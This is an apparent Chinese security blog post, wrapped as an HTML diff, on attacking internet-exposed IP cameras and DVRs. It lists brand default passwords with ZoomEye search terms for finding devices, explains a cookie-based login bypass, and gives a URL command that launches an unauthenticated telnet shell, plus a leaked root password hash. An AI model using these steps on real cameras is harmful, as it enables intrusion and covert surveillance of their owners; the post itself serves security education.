@@ -1,0 +1,383 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="0x01 简介随着物联网的普及，现在大量的摄像头都接入到了公网，方便了用户的访问的同时，也方便了他人。加之摄像机本身的安全性差，就带来了一系列的安全隐患。目前摄像机最大的安全问题的就是默认口令，很大一部分用户都不会修改。其次还有厂商为了方便管理留下了后门，再有就是对摄像机的固件进行分析，发现的一系列漏洞。">
+<meta name="keywords" content="camera,wekapassword">
+<meta property="og:type" content="article">
+<meta property="og:title" content="互联网的眼睛-网络摄像头">
+<meta property="og:url" content="http:&#x2F;&#x2F;zerokeeper.github.io&#x2F;web-security&#x2F;internet-eyes-webcam.html">
+<meta property="og:site_name" content="ZeroKeeper">
+<meta property="og:description" content="0x01 简介随着物联网的普及，现在大量的摄像头都接入到了公网，方便了用户的访问的同时，也方便了他人。加之摄像机本身的安全性差，就带来了一系列的安全隐患。目前摄像机最大的安全问题的就是默认口令，很大一部分用户都不会修改。其次还有厂商为了方便管理留下了后门，再有就是对摄像机的固件进行分析，发现的一系列漏洞。">
+<meta property="og:locale" content="en">
+<meta property="og:image" content="https:&#x2F;&#x2F;static-1257872780.cos.ap-shanghai.myqcloud.com&#x2F;eye.jpg">
+<meta property="og:image" content="https:&#x2F;&#x2F;static-1257872780.cos.ap-shanghai.myqcloud.com&#x2F;camera-cookie.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;static-1257872780.cos.ap-shanghai.myqcloud.com&#x2F;camera-view.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;static-1257872780.cos.ap-shanghai.myqcloud.com&#x2F;camera-telnet.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;static-1257872780.cos.ap-shanghai.myqcloud.com&#x2F;camera-file.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;static-1257872780.cos.ap-shanghai.myqcloud.com&#x2F;camera-code.png">
+<meta property="og:updated_time" content="2019-10-20T07:31:45.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https:&#x2F;&#x2F;static-1257872780.cos.ap-shanghai.myqcloud.com&#x2F;eye.jpg">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>互联网的眼睛-网络摄像头</title>
+    <!-- styles -->
+    <link rel="stylesheet" href="/css/style.css">
+    <!-- persian styles -->
+    
+      <link rel="stylesheet" href="/css/rtl.css">
+    
+    <!-- rss -->
+    
+    
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/categories/">Categories</a></li>
+         
+          <li><a href="/tags/">Tags</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/links/">Links</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/programing/python-query-urp-educational-system-performance.html"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/experience/hexo-blog-markdown-writing-grammar.html"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://zerokeeper.github.io/web-security/internet-eyes-webcam.html" target="_blank" rel="noopener"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://zerokeeper.github.io/web-security/internet-eyes-webcam.html&text=互联网的眼睛-网络摄像头" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://zerokeeper.github.io/web-security/internet-eyes-webcam.html&title=互联网的眼睛-网络摄像头" target="_blank" rel="noopener"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://zerokeeper.github.io/web-security/internet-eyes-webcam.html&is_video=false&description=互联网的眼睛-网络摄像头" target="_blank" rel="noopener"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=互联网的眼睛-网络摄像头&body=Check out this article: http://zerokeeper.github.io/web-security/internet-eyes-webcam.html" target="_blank" rel="noopener"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://zerokeeper.github.io/web-security/internet-eyes-webcam.html&title=互联网的眼睛-网络摄像头" target="_blank" rel="noopener"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://zerokeeper.github.io/web-security/internet-eyes-webcam.html&title=互联网的眼睛-网络摄像头" target="_blank" rel="noopener"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://zerokeeper.github.io/web-security/internet-eyes-webcam.html&title=互联网的眼睛-网络摄像头" target="_blank" rel="noopener"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://zerokeeper.github.io/web-security/internet-eyes-webcam.html&title=互联网的眼睛-网络摄像头" target="_blank" rel="noopener"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://zerokeeper.github.io/web-security/internet-eyes-webcam.html&name=互联网的眼睛-网络摄像头&description=&lt;h2 id=&#34;0x01-简介&#34;&gt;&lt;a href=&#34;#0x01-简介&#34; class=&#34;headerlink&#34; title=&#34;0x01 简介&#34;&gt;&lt;/a&gt;0x01 简介&lt;/h2&gt;&lt;p&gt;随着物联网的普及，现在大量的摄像头都接入到了公网，方便了用户的访问的同时，也方便了他人。加之摄像机本身的安全性差，就带来了一系列的安全隐患。目前摄像机最大的安全问题的就是默认口令，很大一部分用户都不会修改。其次还有厂商为了方便管理留下了后门，再有就是对摄像机的固件进行分析，发现的一系列漏洞。&lt;br&gt;&lt;img src=&#34;https://static-1257872780.cos.ap-shanghai.myqcloud.com/eye.jpg&#34; alt=&#34;&#34;&gt;&lt;/p&gt;" target="_blank" rel="noopener"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-简介"><span class="toc-number">1.</span> <span class="toc-text">0x01 简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-类型"><span class="toc-number">2.</span> <span class="toc-text">0x02 类型</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-漏洞分析"><span class="toc-number">3.</span> <span class="toc-text">0x03 漏洞分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#弱口令"><span class="toc-number">4.</span> <span class="toc-text">弱口令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WEB认证绕过"><span class="toc-number">5.</span> <span class="toc-text">WEB认证绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#反弹shell"><span class="toc-number">6.</span> <span class="toc-text">反弹shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-防御措施"><span class="toc-number">7.</span> <span class="toc-text">0x04 防御措施</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-参考"><span class="toc-number">8.</span> <span class="toc-text">0x05 参考</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        互联网的眼睛-网络摄像头
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">ZeroKeeper</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2017-03-04T23:24:00.000Z" itemprop="datePublished">2017-03-05</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/web-security/">web-security</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link" href="/tags/camera/" rel="tag">camera</a>, <a class="tag-link" href="/tags/wekapassword/" rel="tag">wekapassword</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="0x01-简介"><a href="#0x01-简介" class="headerlink" title="0x01 简介"></a>0x01 简介</h2><p>随着物联网的普及，现在大量的摄像头都接入到了公网，方便了用户的访问的同时，也方便了他人。加之摄像机本身的安全性差，就带来了一系列的安全隐患。目前摄像机最大的安全问题的就是默认口令，很大一部分用户都不会修改。其次还有厂商为了方便管理留下了后门，再有就是对摄像机的固件进行分析，发现的一系列漏洞。<br><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/eye.jpg" alt=""></p>
+<a id="more"></a>
+
+<h2 id="0x02-类型"><a href="#0x02-类型" class="headerlink" title="0x02 类型"></a>0x02 类型</h2><p>网络摄像头(IPCam):<br>由视频服务器和摄像头的集成,通常是linux系统,内置一个web server,画面实时传输,一般没有视频存储功能<br>数字视频录像机(DVR/NVR):<br>进行图像存储处理,可录像,录音,远程监控等等,大概分为PC式和嵌入式,操作系统不固定,只要处理设备装有处理软件即可,有视频存储功能(可回放)<br>中央闭路电视(CCTV):<br>中央电视台?(大雾!)图像通信系统,和DVR/NVR结合起来,通过双绞线(搞不动),光缆(搞不动),网络(可以搞!)接收图像信号,监控室里常见～<br>监控云平台:<br>通过云平台集中管理多个设备</p>
+<h2 id="0x03-漏洞分析"><a href="#0x03-漏洞分析" class="headerlink" title="0x03 漏洞分析"></a>0x03 漏洞分析</h2><h2 id="弱口令"><a href="#弱口令" class="headerlink" title="弱口令"></a>弱口令</h2><p>默认口令是摄像头最严重的问题，简单又粗暴。</p>
+<p>1.海康威视IP网络摄像机：<br>用户：admin，密码：12345<br>zoomeye搜索关键词：hikvision<br>2.大华网络摄像机：<br>user:admin pass:admin 管理权限<br>user:default pass:user 用户默认登陆帐号<br>user:888888 pass:admin<br>user:666666 pass:user<br>zoomeye搜索关键词：WEB SERVICE<br>3.cctv摄像机：<br>user：admin pass：空<br>telnet登陆 user：root pass：”juantech”<br>zoomeye搜索关键词：JAWS/1.0<br>4.SQ-WEBCAM摄像机：<br>user：admin pass：admin<br>zoomeye搜索关键词：SQ-WEBCAM<br>已及其他的一些……</p>
+<pre><code>ACTi: admin/123456 or Admin/123456
+American Dynamics: admin/admin or admin/9999
+Arecont Vision: none
+Avigilon: admin/admin
+Axis: traditionally root/pass, new Axis cameras require password creation during first login
+Basler: admin/admin
+Bosch: none
+Brickcom: admin/admin
+Canon: root/camera
+Cisco: No default password, requires creation during first login
+Dahua: admin/admin
+Digital Watchdog: admin/admin
+DRS: admin/1234
+DVTel: Admin/1234
+DynaColor: Admin/1234
+FLIR: admin/fliradmin
+Foscam: admin/
+GeoVision: admin/admin
+Grandstream: admin/admin
+Hikvision: admin/12345
+Honeywell: admin/1234
+IQinVision: root/system
+IPX-DDK: root/admin or root/Admin\
+JVC: admin/jvc
+March: Networks: admin/
+Mobotix: admin/meinsm
+Panasonic: admin/12345
+Pelco Sarix: admin/admin
+Pixord: admin/admin
+Samsung Electronics: root/root or admin/4321
+Samsung Techwin (old): admin/1111111
+Samsung (new): admin/4321
+Sanyo: admin/admin
+Scallop: admin/password
+Sentry360 (mini): admin/1234
+Sentry360 (pro): none
+Sony: admin/admin
+Speco: admin/1234
+Stardot: admin/admin
+Starvedia: admin/
+Trendnet: admin/admin
+Toshiba: root/ikwd
+VideoIQ: supervisor/supervisor
+Vivotek: root/
+Ubiquiti: ubnt/ubnt
+Wodsee: admin/</code></pre><p>弱口令太简单了就不做演示了。。。</p>
+<h2 id="WEB认证绕过"><a href="#WEB认证绕过" class="headerlink" title="WEB认证绕过"></a>WEB认证绕过</h2><p>cctv存在web认证绕。<br>当你第一次访问的时候，index.html会要求你输入用户名和密码，输入正确，则跳转到view2.html。如果你直接访问view2.html，会被重定向到index.html，要求你输入帐户信息。而其中view2.html中关于登陆验证的代码如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">$(document).ready(function()&#123;</span><br><span class="line">        dvr_camcnt = Cookies.get(&quot;dvr_camcnt&quot;);</span><br><span class="line">        iSetAble = Cookies.get(&quot;iSetAble&quot;);</span><br><span class="line">        iPlayBack = Cookies.get(&quot;iPlayBack&quot;);</span><br><span class="line">        dvr_usr = Cookies.get(&quot;dvr_usr&quot;);</span><br><span class="line">        dvr_pwd = Cookies.get(&quot;dvr_pwd&quot;);</span><br><span class="line">        if(iSetAble == &apos;0&apos;)&#123;</span><br><span class="line">                $(&apos;#pb_settings&apos;).css(&apos;display&apos;,&apos;none&apos;);</span><br><span class="line">                &#125;</span><br><span class="line">        if(iPlayBack == &apos;0&apos;)&#123;</span><br><span class="line">                $(&apos;#pb_review&apos;).css(&apos;display&apos;,&apos;none&apos;);</span><br><span class="line">                &#125;</span><br><span class="line">        if(dvr_camcnt == null || dvr_usr == null || dvr_pwd == null)</span><br><span class="line">        &#123;</span><br><span class="line">                location.href = &quot;/index.html&quot;;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>可以看到，如果dvr_camcnt,dvr_usr,dvr_pwd这3个值为空，就会跳转到index.html，所以我们只要将dvr_camcnt,dvr_usr,&gt;dvr_pwd设置不为空就可以了。其实只需要设置dvr_usr和dvr_pwd就可以了。因为我们访问这个也面的时候系统已经自动填写了dvr_camcnt。</p>
+</blockquote>
+<p><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/camera-cookie.png" alt=""><br>填写后直接访问view2.html,即登陆页面<br><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/camera-view.png" alt=""></p>
+<h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><p>另外cctv还存在内建shell。直接telnetd绑定/bin/sh到任意端口，然后telnet连接过去，不需要认证就可以telnet登录，这个利用方式在你不知道固件本身TELNET的账户信息的时候，是个很常见的利用方法。命令如下：<br><code>http://目标ip/shell?/usr/sbin/telnetd -l/bin/sh -p 25</code><br>然后本地就可以telnet直接免密码登陆了<br><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/camera-telnet.png" alt=""><br><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/camera-file.png" alt=""><br>view2.html登陆部分代码<br><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/camera-code.png" alt=""></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># cat /etc/passwd</span><br><span class="line">    root:a03e3thxwWU0g:0:0::/root:/bin/sh</span><br></pre></td></tr></table></figure>
+<p>破解过后即是”juantech”</p>
+<h2 id="0x04-防御措施"><a href="#0x04-防御措施" class="headerlink" title="0x04 防御措施"></a>0x04 防御措施</h2><p>修改默认密码，加强登陆验证</p>
+<h2 id="0x05-参考"><a href="#0x05-参考" class="headerlink" title="0x05 参考"></a>0x05 参考</h2><ol>
+<li><a href="http://drops.wooyun.org/papers/12945" target="_blank" rel="noopener">某CCTV摄像头漏洞分析</a> </li>
+<li><a href="http://drops.wooyun.org/papers/8298" target="_blank" rel="noopener">Hacking ipcam like Harold in POI - redrain有节操</a></li>
+<li><a href="http://www.wooyun.org/bugs/wooyun-2015-099107" target="_blank" rel="noopener">大量浙江大华监控设备弱口令漏洞</a></li>
+<li><a href="http://s0m30ne.com/2016/04/25/Zoomeye-Pocsuite-%E5%B0%8F%E5%BF%83%E4%BD%A0%E8%83%8C%E5%90%8E%E7%9A%84%E7%9C%BC%E7%9D%9B/" target="_blank" rel="noopener">ZoomEye+Pocsuite: 小心你背后的眼睛</a></li>
+<li><a href="https://github.com/jeanphorn/wordlist" target="_blank" rel="noopener">IP Cameras Default Passwords Directory</a></li>
+</ol>
+
+  </div>
+</article>
+
+    <div class="blog-post-comments">
+        <div id="disqus_thread">
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+        </div>
+    </div>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/categories/">Categories</a></li>
+         
+          <li><a href="/tags/">Tags</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/links/">Links</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-简介"><span class="toc-number">1.</span> <span class="toc-text">0x01 简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-类型"><span class="toc-number">2.</span> <span class="toc-text">0x02 类型</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-漏洞分析"><span class="toc-number">3.</span> <span class="toc-text">0x03 漏洞分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#弱口令"><span class="toc-number">4.</span> <span class="toc-text">弱口令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WEB认证绕过"><span class="toc-number">5.</span> <span class="toc-text">WEB认证绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#反弹shell"><span class="toc-number">6.</span> <span class="toc-text">反弹shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-防御措施"><span class="toc-number">7.</span> <span class="toc-text">0x04 防御措施</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-参考"><span class="toc-number">8.</span> <span class="toc-text">0x05 参考</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://zerokeeper.github.io/web-security/internet-eyes-webcam.html" target="_blank" rel="noopener"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://zerokeeper.github.io/web-security/internet-eyes-webcam.html&text=互联网的眼睛-网络摄像头" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://zerokeeper.github.io/web-security/internet-eyes-webcam.html&title=互联网的眼睛-网络摄像头" target="_blank" rel="noopener"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://zerokeeper.github.io/web-security/internet-eyes-webcam.html&is_video=false&description=互联网的眼睛-网络摄像头" target="_blank" rel="noopener"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=互联网的眼睛-网络摄像头&body=Check out this article: http://zerokeeper.github.io/web-security/internet-eyes-webcam.html" target="_blank" rel="noopener"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://zerokeeper.github.io/web-security/internet-eyes-webcam.html&title=互联网的眼睛-网络摄像头" target="_blank" rel="noopener"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://zerokeeper.github.io/web-security/internet-eyes-webcam.html&title=互联网的眼睛-网络摄像头" target="_blank" rel="noopener"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://zerokeeper.github.io/web-security/internet-eyes-webcam.html&title=互联网的眼睛-网络摄像头" target="_blank" rel="noopener"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://zerokeeper.github.io/web-security/internet-eyes-webcam.html&title=互联网的眼睛-网络摄像头" target="_blank" rel="noopener"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://zerokeeper.github.io/web-security/internet-eyes-webcam.html&name=互联网的眼睛-网络摄像头&description=&lt;h2 id=&#34;0x01-简介&#34;&gt;&lt;a href=&#34;#0x01-简介&#34; class=&#34;headerlink&#34; title=&#34;0x01 简介&#34;&gt;&lt;/a&gt;0x01 简介&lt;/h2&gt;&lt;p&gt;随着物联网的普及，现在大量的摄像头都接入到了公网，方便了用户的访问的同时，也方便了他人。加之摄像机本身的安全性差，就带来了一系列的安全隐患。目前摄像机最大的安全问题的就是默认口令，很大一部分用户都不会修改。其次还有厂商为了方便管理留下了后门，再有就是对摄像机的固件进行分析，发现的一系列漏洞。&lt;br&gt;&lt;img src=&#34;https://static-1257872780.cos.ap-shanghai.myqcloud.com/eye.jpg&#34; alt=&#34;&#34;&gt;&lt;/p&gt;" target="_blank" rel="noopener"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2019 zerokeeper
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/categories/">Categories</a></li>
+         
+          <li><a href="/tags/">Tags</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/links/">Links</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+    <!-- jquery -->
+<script src="/lib/jquery/jquery.min.js"></script>
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+<!-- clipboard -->
+
+  <script src="/lib/clipboard/clipboard.min.js"></script>
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight .code pre").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      target: function(trigger) {
+        return trigger.nextElementSibling;
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+<script src="/js/main.js"></script>
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+    <script type="text/javascript">
+        var disqus_shortname = 'zerokeeper';
+
+        (function(){
+            var dsq = document.createElement('script');
+            dsq.type = 'text/javascript';
+            dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        }());
+    </script>
+
+
+</body>
+</html>
